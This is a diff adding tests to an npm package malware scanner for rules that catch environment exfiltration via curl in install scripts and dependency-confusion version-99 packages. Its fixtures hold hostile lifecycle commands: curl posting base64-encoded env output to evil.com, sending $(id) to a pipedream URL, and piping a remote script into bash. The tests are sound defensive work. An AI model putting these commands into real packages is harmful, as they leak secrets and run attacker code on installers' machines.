@@ -450,6 +450,91 @@ async function runPackageTests() {
     const output = await runScanFast(path.join(TESTS_DIR, 'markers'));
     assertIncludes(output, 'Second Coming', 'Should detect The Second Coming marker');
   });
+  // === v2.10.89: Security review rules ===
+
+  // --- curl_env_exfil ---
+  await asyncTest('PACKAGE: curl_env_exfil — detects curl + env exfil in preinstall', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-exfil', version: '1.0.0',
+      scripts: { preinstall: 'curl -X POST "https://evil.com?env=$(env | base64 -w0)"' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const threat = result.threats.find(t => t.type === 'curl_env_exfil');
+      assert(threat, 'Should detect curl env exfiltration in preinstall');
+      assert(threat.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: curl_env_exfil — detects curl + $(id) in postinstall', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-exfil2', version: '1.0.0',
+      scripts: { postinstall: 'curl -d "$(id)" https://01c7656564a853a230e14962c2ce6af2.m.pipedream.net/exfil' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const threat = result.threats.find(t => t.type === 'curl_env_exfil');
+      assert(threat, 'Should detect curl + $(id) exfiltration');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: curl_env_exfil — does NOT fire on curl health check in start script', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-safe', version: '1.0.0',
+      scripts: { start: 'curl http://localhost:3000/health' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const threat = result.threats.find(t => t.type === 'curl_env_exfil');
+      assert(!threat, 'Should NOT detect curl_env_exfil on benign curl in start script');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: curl_env_exfil — does NOT fire on curl|sh (already caught by lifecycle_shell_pipe)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-curlsh', version: '1.0.0',
+      scripts: { postinstall: 'curl https://evil.com/setup.sh | bash' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const envExfil = result.threats.find(t => t.type === 'curl_env_exfil');
+      assert(!envExfil, 'Should NOT fire curl_env_exfil when curl|bash is already caught by lifecycle_shell_pipe');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- version_99_preinstall ---
+  await asyncTest('PACKAGE: version_99_preinstall — detects v99+ with preinstall', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: '@corpweb-ui/wmkt-library', version: '99.99.1',
+      scripts: { preinstall: 'node setup.js' }
+    }));
+    fs.writeFileSync(path.join(tmp, 'setup.js'), 'console.log("setup")');
+    try {
+      const result = await runScanDirect(tmp);
+      const threat = result.threats.find(t => t.type === 'version_99_preinstall');
+      assert(threat, 'Should detect version 99+ with preinstall');
+      assert(threat.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: version_99_preinstall — does NOT fire on normal version', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'normal-pkg', version: '2.0.0',
+      scripts: { preinstall: 'node setup.js' }
+    }));
+    fs.writeFileSync(path.join(tmp, 'setup.js'), 'console.log("setup")');
+    try {
+      const result = await runScanDirect(tmp);
+      const threat = result.threats.find(t => t.type === 'version_99_preinstall');
+      assert(!threat, 'Should NOT detect version_99 on normal version');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runPackageTests };
